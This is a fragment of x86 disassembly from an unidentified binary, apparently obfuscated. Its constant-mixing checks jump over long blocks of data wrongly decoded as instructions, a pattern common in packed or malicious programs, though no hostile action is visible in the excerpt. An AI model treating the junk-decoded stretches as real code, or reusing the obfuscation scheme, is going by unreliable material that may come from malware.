  409752:	mov    esi,DWORD PTR [ebp-0xc]
  409755:	or     eax,edx
  409757:	movzx  edx,BYTE PTR ds:0x42856d
  40975e:	xor    edx,DWORD PTR ds:0x428485
  409764:	mov    DWORD PTR ds:0x42856d,edx
  40976a:	mov    edx,DWORD PTR [ebp-0x30]
  40976d:	or     ecx,esi
  40976f:	mov    esi,DWORD PTR [ebp-0x2c]
  409772:	or     eax,0xf34
  409777:	neg    DWORD PTR ds:0x428489
  40977d:	or     ecx,0x6c90
  409783:	mov    DWORD PTR ds:0x42847d,0x7584
  40978d:	cmp    edx,eax
  40978f:	mov    DWORD PTR ds:0x428461,0x7ecb
  409799:	jne    0x4097bb
  40979f:	mov    DWORD PTR ds:0x42842d,0x4655
  4097a9:	cmp    esi,ecx
  4097ab:	mov    DWORD PTR ds:0x42842d,0x7ff3
  4097b5:	je     0x40a10f
  4097bb:	xor    esi,esi
  4097bd:	or     esi,DWORD PTR ds:0x42857d
  4097c3:	adc    DWORD PTR ds:0x428505,esi
  4097c9:	mov    DWORD PTR [ebp-0x30],0x5ddc
  4097d0:	mov    DWORD PTR [ebp-0x2c],0x7433
  4097d7:	mov    eax,DWORD PTR [ebp-0x30]
  4097da:	mov    ecx,DWORD PTR [ebp-0x2c]
  4097dd:	xor    ecx,0xfffffd1f
  4097e3:	xor    eax,0xffff9fff
  4097e8:	and    ecx,0x6e0
  4097ee:	and    eax,0x6244
  4097f3:	mov    DWORD PTR [ebp-0x10],eax
  4097f6:	mov    DWORD PTR [ebp-0xc],ecx
  4097f9:	mov    DWORD PTR [ebp-0x20],0x4a50
  409800:	mov    DWORD PTR [ebp-0x1c],0x2079
  409807:	mov    DWORD PTR [ebp-0x28],0x792e
  40980e:	mov    DWORD PTR [ebp-0x24],0x10e8
  409815:	mov    DWORD PTR [ebp-0x30],0x22b3
  40981c:	mov    DWORD PTR [ebp-0x2c],0x2293
  409823:	mov    eax,DWORD PTR [ebp-0x30]
  409826:	mov    ecx,DWORD PTR [ebp-0x2c]
  409829:	mov    edx,DWORD PTR [ebp-0x28]
  40982c:	mov    esi,DWORD PTR [ebp-0x24]
  40982f:	add    eax,edx
  409831:	mov    edx,DWORD PTR [ebp-0x20]
  409834:	adc    ecx,esi
  409836:	mov    esi,DWORD PTR [ebp-0x1c]
  409839:	add    eax,0x3e60
  40983e:	adc    ecx,0xd49e
  409844:	xor    eax,0x14ce
  409849:	xor    ecx,0x354f
  40984f:	add    eax,edx
  409851:	mov    edx,DWORD PTR [ebp-0x10]
  409854:	adc    ecx,esi
  409856:	mov    esi,DWORD PTR [ebp-0xc]
  409859:	cmp    edx,eax
  40985b:	jne    0x409869
  409861:	cmp    esi,ecx
  409863:	je     0x40a10f
  409869:	mov    DWORD PTR [ebp-0x28],0x4db
  409870:	mov    DWORD PTR [ebp-0x24],0x233b
  409877:	mov    DWORD PTR [ebp-0x30],0x2c94
  40987e:	push   0x6b33
  409883:	mov    DWORD PTR [ebp-0x2c],0x647f
  40988a:	jmp    0x409b09
  40988f:	and    BYTE PTR [ebx-0x53bd1443],ah
  409895:	sub    al,0xab
  409897:	dec    edi
  409898:	test   al,0xc
  40989a:	xchg   edx,eax
  40989b:	mov    eax,ds:0xf290926b
  4098a0:	xchg   DWORD PTR [esi-0x413d8642],edi
  4098a6:	mov    esi,0xc21c4287
  4098ab:	add    cl,cl
  4098ad:	bound  edx,QWORD PTR [edi+0x76078bc7]
  4098b3:	push   ecx
  4098b4:	call   FWORD PTR [eax+0x3f]
  4098b7:	aaa    
  4098b8:	pop    eax
  4098b9:	shl    DWORD PTR [ebp-0x39],cl
  4098bc:	cmp    eax,0x948c0708
  4098c1:	dec    ecx
  4098c2:	and    al,BYTE PTR [ebx]
  4098c4:	dec    edi
  4098c5:	pop    ss
  4098c6:	sub    eax,0x55ec3cb0
  4098cb:	mov    bh,0x11
  4098cd:	mov    edi,DWORD PTR [edx]
  4098cf:	imul   dx,sp,0xff9c
  4098d3:	out    dx,al
  4098d4:	xchg   edi,eax
  4098d5:	outs   dx,DWORD PTR ds:[esi]
  4098d6:	jb     0x409947
  4098d8:	xchg   ebp,eax
  4098d9:	test   BYTE PTR [esi+0x16],bh
  4098dc:	iret   
  4098dd:	jg     0x409876
  4098df:	(bad)  
  4098e0:	sahf   
  4098e1:	inc    al
  4098e3:	call   0x3ea8832b
  4098e8:	and    BYTE PTR [edx],0xcb
  4098eb:	mov    al,ds:0xb661f8b5
  4098f0:	and    BYTE PTR ds:0x8cd9f6f3,0x40
  4098f7:	sub    BYTE PTR [ebx],dh
  4098f9:	jmp    0x8e8fd82b
  4098fe:	loop   0x40994e
  409900:	repnz mov dl,0xd0
  409903:	xchg   BYTE PTR [edi-0x4ee6da22],bh
  409909:	pusha  
  40990a:	pop    ss
  40990b:	push   esp
  40990c:	push   0x555c56ec
  409911:	les    ebx,FWORD PTR [ecx+0x5f179e9c]
  409917:	jb     0x40989e
  409919:	jecxz  0x40992c
  40991b:	dec    ebx
  40991c:	jo     0x40993e
  40991e:	mov    eax,0xa5d86f3e
  409923:	pop    edx
  409924:	call   0x4bc5:0xb37b242d
  40992b:	xor    BYTE PTR [eax+0x24ca03e4],al
  409931:	outs   dx,DWORD PTR ds:[esi]
  409932:	sbb    ch,0xfd
  409935:	dec    esi
  409936:	inc    ecx
  409937:	pop    esp
  409938:	dec    edi
  409939:	rcr    DWORD PTR [eax-0xf],0xf2
  40993d:	(bad)  
  40993e:	lahf   
  40993f:	icebp  
  409940:	inc    ebx
  409941:	popa   
  409942:	xor    ah,BYTE PTR [edx-0x6bb96a29]
  409948:	les    edi,FWORD PTR [edx]
  40994a:	sub    dl,ah
  40994c:	xchg   edx,eax
  40994d:	fcom   QWORD PTR [ecx-0x77]
  409950:	shl    BYTE PTR [edx+edx*8-0x45],1
  409954:	and    BYTE PTR [esi],0xd5
  409957:	loopne 0x4099cd
  409959:	inc    eax
  40995a:	push   ebx
  40995b:	xor    DWORD PTR [ebx],0xffffffef
  40995e:	xchg   DWORD PTR [ebp-0x34b5651b],ebx
  409964:	repnz push cs
  409966:	xchg   edi,eax
  409967:	sbb    eax,0xed2a1776
  40996c:	add    eax,0x4238bd95
  409971:	mov    edi,0xbb974388
  409976:	lahf   
  409977:	xchg   ebp,eax
  409978:	inc    esp
  409979:	fstp   st(7)
  40997b:	push   edi
  40997c:	cmp    dh,cl
  40997e:	push   0xffffffff
  409980:	pop    esp
  409981:	jb     0x409974
  409983:	aad    0xae
  409985:	mov    ds:0x4a8e18d6,eax
  40998a:	push   ebp
  40998b:	es mov ebp,0xe957a1b9
  409991:	mov    BYTE PTR [ebp-0xf05f13c],dh
  409997:	mov    BYTE PTR [edi-0x2615dd7b],cl
  40999d:	mov    ebp,0x13400d9c
  4099a2:	shr    dl,cl
  4099a4:	je     0x4099e4
  4099a6:	scas   al,BYTE PTR es:[edi]
  4099a7:	xchg   ebp,eax
  4099a8:	fdivr  QWORD PTR [eax]
  4099aa:	pop    edi
  4099ab:	rcr    ah,1
  4099ad:	outs   dx,DWORD PTR ds:[esi]
  4099ae:	mov    WORD PTR [ecx-0x66f47325],fs
  4099b4:	jne    0x4099f2
  4099b6:	jmp    0x817ff2b1
  4099bb:	ret    0x2d15
  4099be:	push   edi
  4099bf:	imul   eax,DWORD PTR [ebx-0x7a288901],0x6c
  4099c6:	outs   dx,BYTE PTR ds:[esi]
  4099c7:	ds sti 
  4099c9:	or     al,0x4a
  4099cb:	test   al,0x99
  4099cd:	pop    eax
  4099ce:	xor    ch,bl
  4099d0:	pop    esp
  4099d1:	(bad)  
  4099d2:	mov    cl,0x9d
  4099d4:	sub    ebp,DWORD PTR [ecx+0x38]
  4099d7:	(bad)  
  4099d9:	jecxz  0x409a10
  4099db:	repz sub al,0xdf
  4099de:	jmp    0x4ad2:0x2ef9dcb5
  4099e5:	jmp    0x4099ba
  4099e7:	xchg   edi,eax
  4099e8:	popa   
  4099e9:	mov    eax,0x6b8b2cf3
  4099ee:	and    eax,0x9a01ffd9
  4099f3:	ds sti 
  4099f5:	sub    DWORD PTR [edi-0x4b2f3f86],edi
  4099fb:	outs   dx,DWORD PTR ds:[esi]
  4099fc:	les    esi,FWORD PTR [edx]
  4099fe:	push   ecx
  4099ff:	add    ah,dl
  409a01:	pop    esi
  409a02:	test   al,bl
  409a04:	popf   
  409a05:	push   eax
  409a06:	dec    eax
  409a07:	loope  0x4099fa
  409a09:	cmp    BYTE PTR [eax-0x4f89b47b],bl
  409a0f:	daa    
  409a10:	das    
  409a11:	call   0x2ef981af
  409a16:	xchg   ecx,eax
  409a17:	and    eax,0xbedf2d5a
  409a1c:	fdivp  st(3),st
  409a1e:	stc    
  409a1f:	cmp    eax,DWORD PTR [edx]
  409a21:	cmp    BYTE PTR [esi-0x77],bl
  409a24:	cmp    eax,0x408c1566
  409a29:	rol    DWORD PTR [esi+0x21cfc17a],1
  409a2f:	cmc    
  409a30:	push   es
  409a31:	push   0xe
  409a33:	or     dh,BYTE PTR [edi-0x7059ef51]
  409a39:	data16 scas al,BYTE PTR es:[edi]
  409a3b:	call   FWORD PTR [esi-0x61]
  409a3e:	shl    DWORD PTR [esi],cl
  409a40:	mov    eax,0xafc13c82
  409a45:	push   0x47
  409a47:	jg     0x409aa4
  409a49:	mov    bl,0x5a
  409a4b:	mov    esp,DWORD PTR [esp+edx*4+0x32]
  409a4f:	mov    eax,0x4f0a707e
  409a54:	push   eax
  409a55:	mov    esi,DWORD PTR [ebx]
  409a57:	pop    ecx
  409a58:	xor    eax,0x540c05fe
  409a5d:	push   ebx
  409a5e:	inc    edi
  409a5f:	jb     0x409a21
  409a61:	push   esi
  409a62:	mov    WORD PTR [edx+0x7beae397],gs
  409a68:	pop    esi
  409a69:	cdq    
  409a6a:	sar    DWORD PTR ds:0x31701680,0x75
  409a71:	nop
  409a72:	xor    ecx,eax
  409a74:	sub    dl,BYTE PTR [esi]
  409a76:	aad    0xd6
  409a78:	mov    cl,0x28
  409a7a:	std    
  409a7b:	dec    eax
  409a7c:	test   eax,0xd61c545
  409a81:	jno    0x409a96
  409a83:	(bad)  
  409a84:	pop    ss
  409a85:	sar    BYTE PTR [edi+0x30],0xc8
  409a89:	add    eax,0x4ae8cb85
  409a8e:	mov    al,ds:0xbde5e976
  409a93:	mov    DWORD PTR [ecx],eax
  409a95:	jno    0x409a2b
  409a97:	test   BYTE PTR ds:0x5e1acc15,bh
  409a9d:	xor    al,0xee
  409a9f:	iret   
  409aa0:	imul   bh
  409aa2:	and    eax,0x48e6ac50
  409aa7:	arpl   WORD PTR [esi-0x55],bp
  409aaa:	and    al,0x71
  409aac:	fdivr  st(1),st
  409aae:	xchg   ecx,eax
  409aaf:	add    al,0x83
  409ab1:	pop    ss
  409ab2:	mov    fs,WORD PTR [ecx]
  409ab4:	jmp    0xbd9a:0xd544c2e1
  409abb:	jp     0x409ad5
  409abd:	pop    edi
  409abe:	adc    BYTE PTR [edi+0x29],bh
  409ac1:	push   0x23a469d4
  409ac6:	xor    al,0xcb
  409ac8:	rcl    BYTE PTR [edx],0x59
  409acb:	mov    al,0x85
  409acd:	adc    al,ch
  409acf:	lds    ebx,FWORD PTR [edx+0x621c09c7]
  409ad5:	mov    bl,BYTE PTR [ebx]
  409ad7:	(bad)  [eax]
  409ad9:	in     al,dx
  409ada:	cmp    DWORD PTR ds:0x802c3b1f,eax
  409ae0:	push   ds
  409ae1:	out    dx,al
  409ae2:	fsubr  DWORD PTR [ecx]
  409ae4:	adc    dl,ah
  409ae6:	imul   bh
  409ae8:	ret    
  409ae9:	xor    esp,DWORD PTR [ebx-0x6ea307e2]
  409aef:	cld    
  409af0:	in     al,0x40
  409af2:	xlat   BYTE PTR ds:[ebx]
  409af3:	push   edx
  409af4:	cmp    eax,0x32ed578f
  409af9:	imul   edi,DWORD PTR [ebp-0x3ca086a2],0x3d
  409b00:	pop    edi
  409b01:	jge    0x409aa7
  409b03:	mov    DWORD PTR [eax+0xa5ea0d7],edx
  409b09:	mov    eax,DWORD PTR [ebp-0x30]
  409b0c:	mov    ecx,DWORD PTR [ebp-0x2c]
  409b0f:	push   0x7c8f
  409b14:	push   ecx
  409b15:	push   eax
  409b16:	call   0x41594e
  409b1b:	mov    ecx,DWORD PTR [ebp-0x28]
  409b1e:	mov    esi,DWORD PTR [ebp-0x24]
  409b21:	push   0x4e1a18a
  409b26:	push   0x283cdcc
  409b2b:	and    edx,esi
  409b2d:	and    eax,ecx
  409b2f:	push   edx
  409b30:	push   eax
  409b31:	call   0x41594e
  409b36:	xor    eax,0x687b
  409b3b:	xor    edx,0x18d4
  409b41:	mov    DWORD PTR [ebp-0x30],eax
  409b44:	mov    DWORD PTR [ebp-0x2c],edx
  409b47:	mov    eax,ds:0x42293c
  409b4c:	cmp    eax,0x7cd80819
  409b51:	jne    0x40a10f
  409b57:	mov    eax,DWORD PTR [ebp-0x18]
  409b5a:	mov    ecx,DWORD PTR [ebp-0x14]
  409b5d:	mov    edx,DWORD PTR [ebp-0x18]
  409b60:	mov    esi,DWORD PTR [ebp-0x14]
  409b63:	shrd   eax,ecx,0x2
  409b67:	shl    edx,0x1e
  409b6a:	mov    edx,DWORD PTR ds:0x422728
  409b70:	mov    edx,DWORD PTR [edx+0x1a8]
  409b76:	shr    ecx,0x2
  409b79:	xor    esi,esi
  409b7b:	mov    ecx,0x32de6d5d
  409b80:	xor    eax,ecx
  409b82:	or     eax,esi
  409b84:	mov    DWORD PTR [edx],eax
  409b86:	mov    eax,DWORD PTR [ebp-0x18]
  409b89:	mov    edx,DWORD PTR [ebp-0x14]
  409b8c:	shrd   eax,edx,0x2
  409b90:	shr    edx,0x2
  409b93:	mov    edx,DWORD PTR [ebp-0x18]
  409b96:	mov    esi,DWORD PTR [ebp-0x14]
  409b99:	xor    eax,ecx
  409b9b:	xor    esi,esi
  409b9d:	or     eax,esi
  409b9f:	mov    ds:0x42293c,eax
  409ba4:	mov    BYTE PTR [ebp-0x2],0x4f
  409ba8:	mov    BYTE PTR [ebp-0x1],0xf9
  409bac:	movzx  eax,BYTE PTR [ebp-0x1]
  409bb0:	shl    edx,0x1e
  409bb3:	mov    dl,BYTE PTR [ebp-0x2]
  409bb6:	xor    al,0x42
  409bb8:	add    al,dl
  409bba:	jmp    0x409e39
  409bbf:	mov    ah,0x7e
  409bc1:	mov    ch,0xd4
  409bc3:	mov    ebx,0x3e9ebcfc
  409bc8:	mov    cl,0x9a
  409bca:	jecxz  0x409bd1
  409bcc:	cdq    
  409bcd:	dec    esp
  409bce:	xchg   edx,eax
  409bcf:	scas   al,BYTE PTR es:[edi]
  409bd0:	mov    edi,DWORD PTR [esi-0x413d8642]
  409bd6:	mov    esi,0xdaf30b37
  409bdb:	arpl   WORD PTR [esi],ax
  409bdd:	cmp    BYTE PTR [edi],bl
  409bdf:	bound  ebp,QWORD PTR [ecx+0x29]
  409be2:	aam    0x37
  409be4:	hlt    
  409be5:	sbb    eax,0x2bde7647
  409bea:	xchg   esp,eax
  409beb:	lods   eax,DWORD PTR ds:[esi]
  409bec:	in     eax,0x63
  409bee:	retf   
  409bef:	cmp    edi,edi
  409bf1:	ror    DWORD PTR [ebx],0x6b
  409bf4:	daa    
  409bf5:	ret    
  409bf6:	or     BYTE PTR [ecx+0x258f6a66],al
  409bfc:	out    dx,eax
  409bfd:	mov    dl,BYTE PTR [edi+0x5]
  409c00:	gs mov esi,0xd30b92a5
  409c06:	test   BYTE PTR [ecx+esi*8+0x5b],0xb6
  409c0b:	jmp    0xd9ed:0x5f712365
  409c12:	add    dl,BYTE PTR [ebx]
  409c14:	sbb    al,0xaa
  409c16:	pop    eax
  409c17:	push   es
  409c18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c19:	rol    BYTE PTR [edi-0x145fb08f],1
  409c1f:	add    eax,0x255fcc0e
  409c24:	vpsubw xmm6,xmm7,xmm2
  409c28:	leave  
  409c29:	repnz xor ecx,DWORD PTR [ebx-0x6b]
  409c2d:	in     al,dx
  409c2e:	fdiv   st(0),st
  409c30:	jmp    0x409c51
  409c32:	cmp    eax,0x4145bd26
  409c37:	lods   eax,DWORD PTR ds:[esi]
  409c38:	test   eax,0xccf6740
  409c3d:	sbb    al,0x33
  409c3f:	sub    bh,BYTE PTR [ebx-0x20]
  409c42:	das    
  409c43:	adc    al,BYTE PTR [ebx+0x62]
  409c46:	mov    esp,0x95b5f561
  409c4b:	add    esp,DWORD PTR [ebx+eiz*4+0x1a453ff2]
  409c52:	adc    edx,ebp
  409c54:	(bad)  
  409c55:	popf   
  409c56:	or     al,0xc9
  409c58:	call   0x228d748a
  409c5d:	addr16 jae 0x409cb8
  409c60:	push   0x2a2ec3a0
  409c65:	xor    eax,0xa118e1c7
  409c6a:	cmp    ah,BYTE PTR [eax-0x22682864]
  409c70:	push   0x16e6b46d
  409c75:	inc    eax
  409c76:	js     0x409ccf
  409c78:	or     DWORD PTR [eax],ebp
  409c7a:	por    mm4,QWORD PTR [ebx]
  409c7d:	and    bl,BYTE PTR [edx]
  409c7f:	dec    ebx
  409c80:	pop    edx
  409c81:	cmp    al,0xa8
  409c83:	call   0xef1d91ed
  409c88:	cmp    esp,DWORD PTR [ecx]
  409c8a:	dec    BYTE PTR [edx+0x77e59e7d]
  409c90:	call   0xed8f:0x335bbdc6
  409c97:	pop    ebp
  409c98:	sar    BYTE PTR [eax+ebx*1+0x77],cl
  409c9c:	ror    DWORD PTR [edi+edi*1-0x28985534],cl
  409ca3:	sub    ecx,DWORD PTR [ebx]
  409ca5:	push   ecx
  409ca6:	pop    ss
  409ca7:	push   ebx
  409ca8:	push   ecx
  409ca9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409caa:	add    eax,0x856932d3
  409caf:	repnz xor ah,BYTE PTR [eax-0x71]
  409cb3:	or     eax,0x3e7410
  409cb8:	dec    eax
  409cb9:	jmp    0xedb8:0xd7312536
  409cc0:	jp     0x409ca4
  409cc2:	dec    ebx
  409cc3:	pop    eax
  409cc4:	nop
  409cc5:	std    
  409cc6:	mov    ds,WORD PTR [edi-0x49]
  409cc9:	xrelease xchg DWORD PTR [ebx],eax
  409ccc:	shr    DWORD PTR [edx-0x2edaaca9],1
  409cd2:	cmp    eax,0x6e50927d
  409cd7:	fwait
  409cd8:	push   esi
  409cd9:	cwde   
  409cda:	xchg   ecx,eax
  409cdb:	push   0x63
  409cdd:	fisttp QWORD PTR [esi]
  409cdf:	xlat   BYTE PTR ds:[ebx]
  409ce0:	jno    0x409d1a
  409ce2:	or     al,BYTE PTR [ebp-0x80]
  409ce5:	push   esi
  409ce6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ce7:	jno    0x409cd0
  409ce9:	dec    ebx
  409cea:	jbe    0x409c9e
  409cec:	sub    ebx,eax
  409cee:	push   ss
  409cef:	xchg   esi,esp
  409cf1:	jmp    0x774b1828
  409cf6:	rcr    ebp,1
  409cf8:	adc    edi,DWORD PTR [eax-0x6a]
  409cfb:	xchg   ebx,eax
  409cfc:	mov    esp,0x27acd240
  409d01:	mov    dh,0x54
  409d03:	inc    edi
  409d04:	shr    BYTE PTR [edi],cl
  409d06:	jl     0x409cbd
  409d08:	in     eax,0xac
  409d0a:	repz int3 
  409d0c:	or     BYTE PTR [edx-0x37],0x99
  409d10:	fisubr DWORD PTR [esi]
  409d12:	sbb    eax,0x4549a4d1
  409d17:	xchg   dh,cl
  409d19:	cmp    eax,0x1d07a6ab
  409d1e:	xor    al,0x7a
  409d20:	loope  0x409d14
  409d22:	lods   al,BYTE PTR ds:[esi]
  409d23:	xor    al,0xf6
  409d25:	jge    0x409d8a
  409d27:	xchg   esi,eax
  409d28:	out    0xf0,eax
  409d2a:	and    al,0xd9
  409d2c:	xlat   BYTE PTR ds:[ebx]
  409d2d:	push   cs
  409d2e:	hlt    
  409d2f:	and    eax,edx
  409d31:	and    BYTE PTR [ecx+0x37257118],0xc2
  409d38:	add    BYTE PTR [esi-0x3b],cl
  409d3b:	jns    0x409cfd
  409d3d:	js     0x409d8b
  409d3f:	addr16 dec ebx
  409d41:	jl     0x409d5f
  409d43:	push   ecx
  409d44:	call   FWORD PTR [ebx+0x36]
  409d47:	pop    edx
  409d48:	mov    ebp,0x941666de
  409d4d:	jae    0x409da8
  409d4f:	adc    esi,DWORD PTR [eax-0x7b]
  409d52:	sub    DWORD PTR [ecx+edi*2-0x17],esp
  409d56:	fstp   TBYTE PTR [eax]
  409d58:	dec    ebp
  409d59:	or     ebx,DWORD PTR [ebx+0x7328af3c]
  409d5f:	inc    ecx
  409d60:	stc    
  409d61:	push   eax
  409d62:	or     bh,BYTE PTR [esi+0x46241dbc]
  409d68:	into   
  409d69:	or     bl,BYTE PTR [edi-0x1a]
  409d6c:	push   ecx
  409d6d:	xchg   ecx,eax
  409d6e:	cli    
  409d6f:	and    BYTE PTR [ebx],ch
  409d71:	jae    0x409db5
  409d73:	cmc    
  409d74:	add    al,BYTE PTR [edi+esi*2+0x53554094]
  409d7b:	pusha  
  409d7c:	add    al,0x2c
  409d7e:	jg     0x409d9a
  409d80:	ins    DWORD PTR es:[edi],dx
  409d81:	mov    ebx,0x79625339
  409d86:	jbe    0x409d94
  409d88:	adc    dl,BYTE PTR [ecx+ebx*1+0x26984bf1]
  409d8f:	xchg   esi,eax
  409d90:	dec    bp
  409d92:	cli    
  409d93:	loopne 0x409d9a
  409d95:	and    eax,esi
  409d97:	test   BYTE PTR [edi+0x58],al
  409d9a:	and    BYTE PTR [edi+0x45],ah
  409d9d:	(bad)  
  409d9e:	retf   0x82bb
  409da1:	aas    
  409da2:	out    dx,eax
  409da3:	jmp    0x12c3eadc
  409da8:	iret   
  409da9:	in     eax,dx
  409daa:	arpl   WORD PTR [ebp+0x3b],ax
  409dad:	dec    edx
  409dae:	xchg   BYTE PTR [eax+ebx*4+0x23],dl
  409db2:	loope  0x409d3f
  409db4:	and    DWORD PTR [edx],esi
  409db6:	jne    0x409d4d
  409db8:	pcmpeqw mm3,mm7
  409dbb:	adc    DWORD PTR [ecx+0x5],esi
  409dbe:	loop   0x409d97
  409dc0:	sub    eax,0x6710e829
  409dc5:	imul   ecx,DWORD PTR [ebx-0x16c60dac],0x82b02b63
  409dcf:	and    DWORD PTR [edx],esp
  409dd1:	clc    
  409dd2:	(bad)
  409dd5:	mul    BYTE PTR [ebp+0x4d33cdb0]
  409ddb:	ins    BYTE PTR es:[edi],dx
  409ddc:	mov    al,0xcb
  409dde:	test   DWORD PTR [ecx+0x231109da],ecx
  409de4:	cld    
  409de5:	adc    dh,BYTE PTR [ebx-0x62]
  409de8:	push   ss
  409de9:	int3   
  409dea:	test   bl,0x58
  409ded:	mov    al,ds:0x6b38e5e5
  409df2:	test   eax,0x56e357cf
  409df7:	and    eax,esi
  409df9:	mov    ch,0x3
  409dfb:	enter  0xd3e5,0xa6
  409dff:	sub    bh,BYTE PTR es:[edi-0x6d]
  409e03:	test   eax,0x4ccc7071
  409e08:	cs dec esp
  409e0a:	ja     0x409d95
  409e0c:	in     al,0x64
  409e0e:	mov    edx,0x60f9652e
  409e13:	mov    ebx,0x7a40745a
  409e18:	xor    eax,0xe5726d24
  409e1d:	aad    0x8c
  409e1f:	sub    ebp,DWORD PTR [esi+0x389ddcd5]
  409e25:	in     eax,0xac
  409e27:	arpl   WORD PTR [esp+ebp*8+0x4f],cx
  409e2b:	push   es
  409e2c:	sub    esi,DWORD PTR [edi]
  409e2e:	mov    dh,0x7c
  409e30:	jle    0x409df7
  409e32:	imul   edx,ebx,0xc7743453
  409e38:	adc    eax,0xfa05066a
  409e3d:	add    BYTE PTR [eax],al
  409e3f:	add    BYTE PTR [eax+0x45c6fc45],cl
  409e45:	std    
  409e46:	addr16 pop eax
  409e48:	mov    BYTE PTR [ebp-0x1],al
  409e4b:	mov    BYTE PTR [ebp-0x2],0x3
  409e4f:	mov    dl,BYTE PTR [ebp-0x2]
  409e52:	movzx  esi,dl
  409e55:	cdq    
  409e56:	idiv   esi
  409e58:	mov    dl,BYTE PTR [ebp-0x1]
  409e5b:	add    al,dl
  409e5d:	mov    dl,BYTE PTR [ebp-0x3]
  409e60:	or     al,dl
  409e62:	mov    dl,BYTE PTR [ebp-0x4]
  409e65:	add    al,0x3a
  409e67:	cmp    dl,al
  409e69:	jae    0x40a10f
  409e6f:	mov    eax,DWORD PTR [ebp-0x18]
  409e72:	jmp    0x40a0f1
  409e77:	popa   
  409e78:	nop
  409e79:	popf   
  409e7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e7b:	mov    ah,0xb8
  409e7d:	imul   ebx,DWORD PTR [eax+edi*1-0x585b79d4],0x48
  409e85:	je     0x409e64
  409e87:	imul   edx,DWORD PTR [ecx-0x3d864142],0xd1adbebe
  409e91:	(bad)
  409e95:	jl     0x409ef0
  409e97:	push   ds
  409e98:	pop    DWORD PTR [esp+edx*2+0x6e]
  409e9c:	jb     0x409ee2
  409e9e:	mov    ?,WORD PTR [ebx+0x5d509]
  409ea4:	fidivr DWORD PTR [esi]
  409ea6:	cmp    al,0x22
  409ea8:	call   0xe9e2e47a
  409ead:	push   ebp
  409eae:	pop    ebp
  409eaf:	push   esi
  409eb0:	add    BYTE PTR [eax+edx*4],dh
  409eb3:	test   BYTE PTR fs:[eax-0x62],0x5a
  409eb8:	adc    ah,ah
  409eba:	adc    eax,0x3a4009ed
  409ebf:	xor    ebp,DWORD PTR [eax-0x2ecb6112]
  409ec5:	mov    bh,0xe6
  409ec7:	adc    al,0x54
  409ec9:	jecxz  0x409ed7
  409ecb:	mov    edx,0xacba82f1
  409ed0:	ficom  DWORD PTR [edx+0x4b]
  409ed3:	test   BYTE PTR [edx],cl
  409ed5:	sbb    DWORD PTR [eax+0x7],ebx
  409ed8:	retf   0xcfab
  409edb:	pop    edi
  409edc:	(bad)  
  409edd:	shr    DWORD PTR [edx],0xb3
  409ee0:	nop
  409ee1:	adc    dl,BYTE PTR [ecx-0x6b475f1a]
  409ee7:	scas   al,BYTE PTR es:[edi]
  409ee8:	cs inc ebp
  409eea:	inc    ebp
  409eeb:	jb     0x409f6a
  409eed:	lds    ebp,FWORD PTR [ebp-0x12]
  409ef0:	fistp  WORD PTR [edx]
  409ef2:	pop    es
  409ef3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ef4:	adc    al,0x15
  409ef6:	dec    eax
  409ef7:	les    ecx,FWORD PTR [edi-0x3b]
  409efa:	fsub   st(2),st
  409efc:	data16 fild WORD PTR [eax+ebx*1+0x59ece5c8]
  409f04:	xor    ecx,esi
  409f06:	(bad)  
  409f07:	xlat   BYTE PTR ds:[ebx]
  409f08:	mov    ebp,0x8460f6b5
  409f0d:	or     edx,esp
  409f0f:	les    edi,FWORD PTR [ecx+0x4e9805f]
  409f15:	repz call 0x431aaa57
  409f1b:	(bad)  
  409f1c:	ficomp DWORD PTR [ebx+0x4b]
  409f1f:	mov    dh,0xd3
  409f21:	je     0x409f60
  409f23:	jmp    0xd32fca48
  409f28:	xor    bl,BYTE PTR [ecx+0x4]
  409f2b:	fprem  
  409f2d:	cdq    
  409f2e:	pop    ss
  409f2f:	dec    ecx
  409f30:	and    BYTE PTR [ecx-0xdd3204],0xb
  409f37:	push   es
  409f38:	xchg   edi,eax
  409f39:	xor    edx,DWORD PTR [ebx]
  409f3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f3c:	sbb    ch,BYTE PTR [ecx+0x115f4d04]
  409f42:	inc    eax
  409f43:	mov    BYTE PTR [ebx+edi*8+0x6a],0x35
  409f48:	repnz pop ds
  409f4a:	stos   BYTE PTR es:[edi],al
  409f4b:	inc    edx
  409f4c:	cdq    
  409f4d:	and    DWORD PTR [ebp+0x2b480bc3],0x49d9890a
  409f57:	out    dx,al
  409f58:	pop    esi
  409f59:	(bad)  
  409f5a:	dec    ebp
  409f5b:	std    
  409f5c:	sbb    DWORD PTR [esi-0x53],edi
  409f5f:	call   0xc44930ff
  409f64:	fisubr WORD PTR [ebx-0x743e7215]
  409f6a:	push   ecx
  409f6b:	inc    ecx
  409f6c:	std    
  409f6d:	icebp  
  409f6e:	mov    bl,0xa5
  409f70:	enter  0xfd6b,0x56
  409f74:	push   ecx
  409f75:	adc    DWORD PTR [ecx],edx
  409f77:	adc    BYTE PTR [eax+0x7f],0x3
  409f7b:	retf   
  409f7c:	inc    edi
  409f7d:	inc    edi
  409f7e:	popa   
  409f7f:	mov    al,0xb
  409f81:	xchg   esi,eax
  409f82:	das    
  409f83:	rcr    BYTE PTR [edi],1
  409f85:	ror    BYTE PTR [eax+0x6dc99ba0],0xb5
  409f8c:	pop    edx
  409f8d:	xchg   edx,eax
  409f8e:	fsubr  QWORD PTR [edx-0x2c794f8b]
  409f94:	xor    DWORD PTR [edi+0x43],esp
  409f97:	out    dx,eax
  409f98:	xor    al,ah
  409f9a:	jb     0x409fc5
  409f9c:	jbe    0x409f99
  409f9e:	cs sub al,0x7b
  409fa1:	(bad)  
  409fa2:	push   0x78
  409fa4:	bnd je 0x409fe7
  409fa7:	add    eax,0xca74ec5b
  409fac:	icebp  
  409fad:	and    BYTE PTR ds:0x96cd12cb,dh
  409fb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409fb4:	out    0x32,eax
  409fb6:	cwde   
  409fb7:	call   0x507db947
  409fbc:	xor    BYTE PTR [edx+edi*2+0x64aec496],bl
  409fc3:	repnz imul BYTE PTR [eax-0x203c7494]
  409fca:	push   edi
  409fcb:	jmp    0xa2de52f0
  409fd0:	test   BYTE PTR [ebp-0x7324b0e3],0x3d
  409fd7:	mov    ebx,0x4a85a2da
  409fdc:	call   0xc730d95
  409fe1:	push   0x7e
